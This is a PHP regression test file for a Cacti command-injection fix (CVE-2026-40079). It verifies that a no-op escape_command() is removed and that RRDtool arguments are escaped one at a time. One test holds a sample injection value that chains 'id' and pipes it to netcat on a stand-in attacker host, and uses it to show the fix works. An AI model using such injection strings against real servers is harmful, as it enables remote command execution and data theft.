<?php
declare(strict_types = 1);
/*
 +-------------------------------------------------------------------------+
 | Copyright (C) 2004-2026 The Cacti Group                                 |
 +-------------------------------------------------------------------------+
 | Cacti: The Complete RRDtool-based Graphing Solution                     |
 +-------------------------------------------------------------------------+
*/

/**
 * Regression test for CVE-2026-40079 / GHSA-xq98-376r-hv9j.
 *
 * escape_command() returned its argument untouched, so all three calls in
 * __rrd_execute() read as a sanitising step that did nothing. RRDtool
 * arguments are escaped one at a time with cacti_escapeshellarg(); an
 * assembled command line cannot be escaped after the fact. The function and
 * its call sites are gone so no caller can mistake it for protection.
 *
 * @group regression
 */

$rrdPath = dirname(__DIR__, 2) . '/lib/rrd.php';

test('escape_command is gone from lib/rrd.php', function () use ($rrdPath) {
	$source = file_get_contents($rrdPath);

	expect($source)->not->toMatch('/function\s+escape_command\s*\(/');
	expect($source)->not->toMatch('/(?<![\w\$])escape_command\s*\(/');
});

test('escape_command is not redefined elsewhere under lib', function () {
	$found = [];

	foreach (glob(dirname(__DIR__, 2) . '/lib/*.php') as $file) {
		if (preg_match('/function\s+escape_command\s*\(/', file_get_contents($file))) {
			$found[] = basename($file);
		}
	}

	expect($found)->toBe([]);
});

test('__rrd_execute escapes array arguments one at a time', function () use ($rrdPath) {
	$source = file_get_contents($rrdPath);

	expect($source)->toContain("\$command_line = implode(' ', array_map('cacti_escapeshellarg', \$command_line));");
});

test('the shell_exec command line is assembled without a whole-command escape', function () use ($rrdPath) {
	$source = file_get_contents($rrdPath);

	expect($source)->toContain("\$full_commandline = read_config_option('path_rrdtool') . \$debug . ' ' . \$command_line;");
	expect($source)->toContain('$output = shell_exec($full_commandline);');
});

test('the pipe writers pass the command line through untouched', function () use ($rrdPath) {
	$source = file_get_contents($rrdPath);

	expect($source)->toContain('fwrite($pipes[0], $command_line . "\r\nquit\r\n");');
	expect($source)->toContain('if (fwrite($rrdtool_pipe, " $command_line\r\n") === false) {');
});

test('per-argument escaping stops separators that a whole-command escape misses', function () {
	// The commented-out "real" escape_command() only stripped $ and backticks,
	// so the separators that actually chain a second process survived it.
	$payload = '/var/lib/rrd/x.rrd; id | nc attacker 1234';

	$stripped = preg_replace('/(\$|`)/', '', $payload);
	expect($stripped)->toContain('; id');
	expect($stripped)->toContain('| nc');

	// array_map('cacti_escapeshellarg', ...) is what __rrd_execute actually
	// applies, and it contains the whole payload in one argument.
	expect(escapeshellarg($payload))->toBe("'/var/lib/rrd/x.rrd; id | nc attacker 1234'");
});
